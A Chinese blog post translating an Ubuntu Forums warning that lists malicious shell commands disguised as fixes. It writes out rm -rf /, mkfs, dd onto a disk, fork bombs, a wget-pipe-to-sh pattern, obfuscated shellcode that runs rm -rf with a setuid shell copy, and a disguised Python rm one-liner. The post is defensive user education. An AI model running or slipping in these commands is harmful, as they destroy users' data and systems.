---
layout: post
title: Linux恶意命令大全
tags:
- command
- linux
- ubuntu
status: publish
type: post
published: true
meta:
  _searchme: '1'
  views: '1183'
  _wp_old_slug: linux%e6%81%b6%e6%84%8f%e5%91%bd%e4%bb%a4%e5%a4%a7%e5%85%a8
---
Ubuntu论坛上的<a href="http://ubuntuforums.org/announcement.php?a=54" target="_blank">公告</a>提醒用户警惕有人假装提供问题解决方案而诱导用户使用恶意命令，并列出了一些恶意命令，特别强调以下是<strong>"DANGEROUS COMMANDS</strong> -- look but <strong>DO NOT RUN"</strong>

<strong>删除</strong>所有文件，当前目录，或当前目录的可见文件:

[code]
rm -rf /
rm -rf .
rm -rf *
[/code]

一个有趣的命令是，当你想删除当前目录的所有隐藏文件时，你也许会用:

[code]
rm -r .*
[/code]

但问题是，这个命令也会删除父目录 ".."，最终这个命令会删除所有父目录的父目录的父目录，也就是删除了所有东西！可能的解决方法是:

[code]
rm -r .[^.]*
[/code]

当然，这个命令可能无法匹配某些想要删除的文件，这个问题留给读者来修正 -,-
（不知道这样行不行: <font color="#3366ff">rm -r .[^.]*</font><font color="#3366ff">; rm -r ..?* </font>不过太土鳖了。。--azalea）

<strong>格式化</strong>

<!--more-->

[code]
mkfs
mkfs.ext3
mkfs.anything
[/code]

<strong>操作块设备</strong>:导致原始数据写入块设备，通常会使文件系统崩溃，数据丢失

[code]
any_command &gt; /dev/sda
dd if=something of=/dev/sda
[/code]

<strong>Forkbomb</strong>(汗。。不知道怎么翻译）：执行大量线程直到死机，用户不得不重启，可能导致系统崩溃、数据损坏等严重后果。在类Bourne shell中, 如Bash: (这个命令绝对会引起尝试的冲动。。）

[code]
:(){:|:&amp;};:
[/code]

详细解说： from <a href="http://hellobmw.com/archives/ubuntus-malicious-commands.html" target="_blank">北极冰仔部落格</a>
<blockquote>:(){:|:&amp; };: 等价于
f() # 定义函数
{ f | f # 这个是精华, 管道线使两个 f 同时运行 }; f # 调用函数永不返回, 无穷递归. bash 的调用栈放在堆上, 结果耗尽所有CPU和内存空间. 而且同时运行的 f() 是指数爆炸式的…</blockquote>
在Perl中
[perl]
fork while fork
[/perl]

<strong>Tarbomb</strong>:把一个被人做了手脚的tar档案文件解压到一个已经存在的目录下。这个tar档案文件可能会变成成千上万个文件或通过猜测文件名注入系统。因此，<strong>要养成习惯在一个刚创建的目录中解压tar文件</strong>。（这段没看懂，原文如此：Someone asks you to extract a tar archive into an existing directory. This tar archive can be crafted to explode into a million files, or inject files into the system by guessing filenames. You should make the habit of decompressing tars inside a cleanly made directory. --azalea)

<strong>解压炸弹</strong>: 解压一个从不可靠来源下载的看起来很小的文件，实际上这个文件可能是被高度压缩的，解压后会膨胀成上百GB，塞满你的硬盘。因此，<strong>不要使用不可靠来源的数据</strong>！

<strong>Shell脚本</strong>：运行可能含恶意代码的shell脚本。因此，<strong>不要运行来自不可信来源的shell脚本</strong>。

[code]
wget http://some_place/some_file
sh ./some_file
[/code]

或
[code]
wget http://some_place/some_file -O- | sh
[/code]

<strong>编译代码</strong>：有人提供给你源代码让你编译，很容易在其中隐藏恶意代码。不要轻易编译源代码或执行编译后的代码，除非来源可靠（比如SourceForge,作者的主页或者Ubuntu官方地址）

一个著名的例子出现在<a href="http://seclists.org/fulldisclosure/2007/Aug/0071.html" target="_blank">一个邮件列表</a>中, 其中有这样一段代码：

[code]
char esp[] __attribute__ ((section(".text"))) /* e.s.p
release */
= "xebx3ex5bx31xc0x50x54x5ax83xecx64x68"
"xffxffxffxffx68xdfxd0xdfxd9x68x8dx99"
"xdfx81x68x8dx92xdfxd2x54x5exf7x16xf7"
"x56x04xf7x56x08xf7x56x0cx83xc4x74x56"
"x8dx73x08x56x53x54x59xb0x0bxcdx80x31"
"xc0x40xebxf9xe8xbdxffxffxffx2fx62x69"
"x6ex2fx73x68x00x2dx63x00"
"cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;";
[/code]

对新手来说，这些代码就像"那些复杂的十六进制的东东"，看起来很安全，但实际上这是运行 rm -rf ~ / &amp;
对于普通用户，这个命令会破坏home目录;而对于root用户，这个命令会破坏整个文件系统。如果你能在十六进制字符串中辨认出这个命令，那你不用担心上述的恶意命令了。否则，要当心恶意命令会以各种新颖的形式出现！

强调一下，以上远不是所有恶意命令的清单。花30秒就可以用python写出以下代码:

[python]
python -c 'import os; os.system("".join([chr(ord(i)-1) for i in "sn!.sg!+"]))'
[/python]

其中的"sn!.sg!+"实际上只是 rm -rf * 上移了一个字母。当然这是个很土鳖的例子--我不希望有人会不经思考就把这段代码粘贴到终端里去。

节译自<a href="http://ubuntuforums.org/announcement.php?a=54" target="_blank">ATTENTION ALL USERS: Malicious Command</a> by <a href="http://ubuntuforums.org/member.php?s=d7c0f60f430aca0675e7f761165e2c28&amp;u=780" target="_blank">jdong</a>